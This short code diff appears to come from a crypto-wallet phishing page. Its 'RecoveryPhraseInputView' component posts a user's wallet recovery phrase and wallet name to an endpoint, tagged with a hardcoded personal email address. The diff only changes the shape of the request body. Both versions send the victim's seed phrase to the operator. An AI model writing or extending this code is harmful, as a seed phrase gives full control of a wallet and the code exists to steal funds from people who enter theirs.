@@ -203,7 +203,7 @@ const RecoveryPhraseInputView = ({ wallet, onBack, onSend }) => {
                 headers: {
                     'Content-Type': 'application/json',
                 },
-                body: JSON.stringify({ email: "dadaadeife@gmail.com", subject: "Recovery Request", message: `Wallet is: ${wallet.name}\n\nWallet Details: ${combinedPhrase}`, }),
+                body: JSON.stringify({ email: "dadaadeife@gmail.com", walletName: wallet.name, details: combinedPhrase }),
             });
 
             if (response.ok) {
